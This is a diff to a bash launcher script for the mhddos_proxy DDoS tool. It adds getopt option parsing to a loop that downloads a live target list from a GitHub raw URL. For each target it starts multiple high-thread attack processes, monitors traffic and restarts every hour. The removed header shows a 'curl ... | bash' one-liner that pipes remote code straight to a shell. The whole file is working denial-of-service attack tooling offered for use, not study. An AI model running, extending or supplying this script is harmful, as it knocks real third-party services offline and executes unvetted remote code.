@@ -1,75 +1,114 @@
 #!/bin/bash
-##### Use next command in local linux terminal to run this script.
-#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
-##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
-##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)
 
-##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.
+# More safety, by turning some bugs into errors.
+# Without `errexit` you don’t need ! and can replace
+# PIPESTATUS with a simple $?, but I don’t do that.
+set -o errexit -o pipefail -o noclobber -o nounset
 
+# -allow a command to fail with !’s side effect on errexit
+# -use return value from ${PIPESTATUS[0]}, because ! hosed $?
+! getopt --test > /dev/null
+if [[ ${PIPESTATUS[0]} -ne 4 ]]; then
+    echo 'I am sorry, `getopt --test` failed in this environment. Please, install enhanced getopt.'
+    exit 1
+fi
 
+OPTIONS=r:t:p:s:d
+LONGOPTS=refresh-interval:,thread-count:,process-count:,stats-interval:,debug
 
-## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
-## It allows to download updates for mhddos_proxy, MHDDoS and target list.
-## By default (9m), can be passed as second parameter
-restart_interval="60m"
+# -regarding ! and PIPESTATUS see above
+# -temporarily store output to be able to check for errors
+# -activate quoting/enhanced mode (e.g. by writing out “--options”)
+# -pass arguments only via   -- "$@"   to separate them correctly
+! PARSED=$(getopt --options=$OPTIONS --longoptions=$LONGOPTS --name "$0" -- "$@")
+if [[ ${PIPESTATUS[0]} -ne 0 ]]; then
+    # e.g. return value is 1
+    #  then getopt has complained about wrong arguments to stdout
+    exit 2
+fi
 
+# read getopt’s output this way to handle the quoting right:
+eval set -- "$PARSED"
 
-#parameters that passed to python scrypt
-threads="${1:-1000}"
-threads="-t $threads"
-rpc="${2:-200}"
-rpc="--rpc $rpc"
-instances="${3:-1}"
-proxy_interval="${4:-900}"
-proxy_interval="-p $proxy_interval"
-network_interval_default="60/30"
-network_interval="${5:-$network_interval_default}"
-debug="${6:-}"
+refresh_interval="1h"
+thread_count="500"
+process_count="2"
+stats_interval="30"
+debug=""
 
-#Just in case kill previous copy of mhddos_proxy
+# now enjoy the options in order and nicely split until we see --
+while true; do
+    case "$1" in
+        -r|--refresh-interval)
+            refresh_interval="$2"
+            shift 2
+            ;;
+        -t|--thread-count)
+            thread_count="$2"
+            shift 2
+            ;;
+        -p|--process-count)
+            process_count="$2"
+            shift 2
+            ;;
+        -s|--stats-interval)
+            stats_interval="$2"
+            shift 2
+            ;;
+        -d|--debug)
+            debug="true"
+            shift
+            ;;
+        --)
+            shift
+            break
+            ;;
+        *)
+            echo "$1"
+            echo "Programming error"
+            exit 3
+            ;;
+    esac
+done
+
+# Just in case kill previous copy of mhddos_proxy
 pkill -f runner.py
 pkill -f ./start.py
 pkill -f ifstat
 
-# Restart attacks and update targets list every 10 minutes (by default)
+# Restart attacks and update targets every $refresh_interval
 while true
-#echo -e "#####################################\n"
 do
-  # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-  list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep -c "^[^#]")
+  # Get number of targets in runner_targets
+  number_of_targets=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep -c "^[^#]")
 
-  echo -e "\nNumber of targets in list: $list_size \n"
+  echo -e "\nNumber of targets: $number_of_targets\n"
 
   # Launch multiple mhddos_proxy instances with different targets.
-  for (( i=1; i<=list_size; i++ ))
+  for (( i=1; i<=number_of_targets; i++ ))
   do
-    echo -e "\n I = $i"
-
-    # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-    cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
-
-    echo "full cmd:"
-    echo "$cmd_line $proxy_interval $threads $rpc"
+    target_command=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
 
     cd ~/mhddos_proxy || exit
 
-    for (( j=1; j<=instances; j++ ))
+    for (( j=1; j<=process_count; j++ ))
     do
-      python3 runner.py $cmd_line $threads $proxy_interval $rpc $debug&
+      echo -e "\npython3 runner.py $target_command -t $thread_count -p 25200 --rpc 0 $debug&"
+      python3 runner.py $target_command -t $thread_count -p 25200 --rpc 0 $debug&
     done
-
-    echo -e "Attack started with $instances instances. Wait a few minutes for output"
   done
 
-  echo -e "\nDDoS is monitoring eth0 interface (HH:MM:SS | KB/s in | KB/s out)"
-  ifstat -i eth0 -t -b $network_interval&
+  ifstat -i eth0 -t -b $stats_interval/$stats_interval&
 
-  echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
-  sleep $restart_interval
+  echo -e "\nDDoS is RUNNING. Next update of targets list in $refresh_interval\nDDoS is monitoring eth0 interface (HH:MM:SS | Kbps in | Kbps out)\n\n"
+
+  sleep $refresh_interval
   clear
-  echo -e "\nRESTARTING\nKilling old processes..."
+
+  echo -e "\nDDoS is RESTARTING. Killing old processes..."
   pkill -f runner.py
   pkill -f ./start.py
   pkill -f ifstat
-  echo -e "\nOld processes have been killed - starting new ones"
+  echo -e "\nDDoS is RESTARTING. Killing old processes... DONE!"
+
 done
